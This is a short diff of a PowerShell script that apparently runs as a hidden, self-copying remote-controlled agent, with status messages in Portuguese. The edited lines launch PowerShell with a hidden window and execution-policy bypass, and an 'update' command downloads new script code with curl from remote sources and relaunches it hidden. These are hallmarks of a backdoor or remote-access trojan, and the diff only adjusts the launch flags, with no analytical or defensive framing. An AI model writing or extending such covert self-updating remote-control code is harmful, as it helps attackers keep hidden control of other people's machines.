@@ -17,8 +17,8 @@ $log  = "$dir\svc.log"
 $posF = "$dir\pos.txt"
 $run  = "$dir\run.txt"
 $shut = "$dir\shut.ps1"
-$tr   = "powershell -w hidden -nop -ep bypass -f `"$self`""
-$trS  = "powershell -w hidden -nop -ep bypass -f `"$shut`""
+$tr   = "powershell -w hidden -ep bypass -f `"$self`""
+$trS  = "powershell -w hidden -ep bypass -f `"$shut`""
 
 New-Item -ItemType Directory $dir -Force | Out-Null
 if ($PSCommandPath -and $PSCommandPath -ne $self) { Copy-Item $PSCommandPath $self -Force }
@@ -146,7 +146,7 @@ while ($true) {
       }
 
       if (Flag "update") {
-        try { Send "[ok] update"; curl.exe -s -o $self $boot; curl.exe -s -o $shut $shutSrc; Start-Process powershell -w hidden -ArgumentList "-nop -ep bypass -f `"$self`""; exit }
+        try { Send "[ok] update"; curl.exe -s -o $self $boot; curl.exe -s -o $shut $shutSrc; Start-Process powershell -w hidden -ArgumentList "-ep bypass -f `"$self`""; exit }
         catch { Send "[falhou] update :: $_" }
       }
 
